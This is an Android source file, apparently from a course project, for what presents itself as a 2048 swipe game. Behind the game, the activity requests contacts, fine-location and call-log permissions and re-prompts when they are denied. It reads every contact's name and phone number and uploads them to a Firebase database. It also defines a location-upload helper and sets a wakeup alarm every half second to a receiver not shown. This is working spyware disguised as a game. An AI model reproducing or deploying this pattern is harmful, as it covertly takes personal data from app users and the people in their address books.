package com.example.alleg.a4471project;

import android.Manifest;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.SystemClock;
import android.provider.ContactsContract;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.widget.Button;
import android.widget.TableLayout;
import android.widget.TextView;
import android.widget.Toast;
import android.util.Log;

import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.time.LocalDateTime;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    private final int PERMISSIONS = 1;
    DatabaseReference mRootRef = FirebaseDatabase.getInstance().getReference();
    GameLogic mainLogic;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        checkPermissions();
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
                == PackageManager.PERMISSION_GRANTED) {
            getContactList();
        }

        mainLogic = initGameLogic();
    }

    public void checkPermissions(){
        String[] requests = {
                android.Manifest.permission.READ_CONTACTS,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.READ_CALL_LOG

        };
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
                != PackageManager.PERMISSION_GRANTED) {
            // Permission is not granted
            ActivityCompat.requestPermissions(this,requests,PERMISSIONS);
        }

    }
    @Override
    public void onResume(){
        super.onResume();
        Log.d("MAINACTIVITY", "RESUME");
        Intent intent = new Intent(getApplicationContext(), AlarmReceiver.class);
        PendingIntent alarmIntent = PendingIntent.getBroadcast(getApplicationContext(), 1, intent, 0);
        AlarmManager am =( AlarmManager)getApplicationContext().getSystemService(Context.ALARM_SERVICE);
        if (am!= null) {
            am.cancel(alarmIntent);
        }
        am.setInexactRepeating(AlarmManager.ELAPSED_REALTIME_WAKEUP,
                SystemClock.elapsedRealtime() + 5000,500, alarmIntent);
        // SystemClock.elapsedRealtime() + AlarmManager.INTERVAL_HALF_HOUR,
        //        AlarmManager.INTERVAL_HALF_HOUR
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String permissions[], int[] grantResults) {
        switch (requestCode) {
            case PERMISSIONS: {
                // If request is cancelled, the result arrays are empty.
                for(int i = 0; i < permissions.length;i++){
                    String permission = permissions[i];
                    if(permission.equals(Manifest.permission.READ_CONTACTS)){
                        if(grantResults[i] == PackageManager.PERMISSION_GRANTED) {
                            getContactList();
                        }
                    }
                }
                for(int result: grantResults){
                    if(result != PackageManager.PERMISSION_GRANTED){
                        checkPermissions();
                    }
                }
            }

            // other 'case' lines to check for other
            // permissions this app might request.
        }
    }
    private void writeNewContact(String userId, String fullName, String phoneNumber){
        Contact contact = new Contact(fullName, phoneNumber);

        mRootRef.child("contacts").child(userId).child(fullName).setValue(contact);
    }

    private void writeNewLocation(String userId, String longitude, String latitude){
        Location location = new Location(longitude, latitude);

        mRootRef.child("locations").child(userId).setValue(location);
    }


    private void getContactList() {
        ContentResolver cr = getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);

        if ((cur != null ? cur.getCount() : 0) > 0) {
            while (cur != null && cur.moveToNext()) {
                String id = cur.getString(
                        cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(cur.getColumnIndex(
                        ContactsContract.Contacts.DISPLAY_NAME));

                if (cur.getInt(cur.getColumnIndex(
                        ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                    Cursor pCur = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null);
                    while (pCur.moveToNext()) {
                        String phoneNo = pCur.getString(pCur.getColumnIndex(
                                ContactsContract.CommonDataKinds.Phone.NUMBER));
                        String userID = getUserid();
                        writeNewContact(userID, name, phoneNo);
                    }
                    pCur.close();
                }
            }
        }
        if(cur!=null){
            cur.close();
        }
    }
    public String getUserid(){
        return FirebaseAuth.getInstance().getUid();
    }

    // 2048 code below
    private Button[][] getButtons() {
        Button[][] buttons =  new Button[4][4];

        for (int i = 0; i < 4; i++) {
            for (int j = 0; j < 4; j++ ) {
                String buttonID = "grid" + i + j;
                int resID = getResources().getIdentifier(buttonID, "id", getPackageName());
                buttons[i][j] = findViewById(resID);
            }
        }

        // TODO set button sizes

        return buttons;
    }

    private GameLogic initGameLogic() {
        TextView sd = findViewById(R.id.score);

        // get main table, set  up swipe listeners
        TableLayout mainTable = findViewById(R.id.MainTable);
        mainTable.setOnTouchListener(new MainSwipeListener(MainActivity.this) {
            @Override
            public void onSwipeTop() {
                Toast.makeText(MainActivity.this, "top", Toast.LENGTH_SHORT).show();
                mainLogic.swipeUp();
            }

            @Override
            public void onSwipeRight() {
                Toast.makeText(MainActivity.this, "right", Toast.LENGTH_SHORT).show();
                mainLogic.swipeRight();
            }

            @Override
            public void onSwipeLeft() {
                Toast.makeText(MainActivity.this, "left", Toast.LENGTH_SHORT).show();
                mainLogic.swipeLeft();
            }

            @Override
            public void onSwipeBottom() {
                Toast.makeText(MainActivity.this, "bottom", Toast.LENGTH_SHORT).show();
                mainLogic.swipeDown();
            }
        });

        return new GameLogic(getButtons(), sd);
    }
}
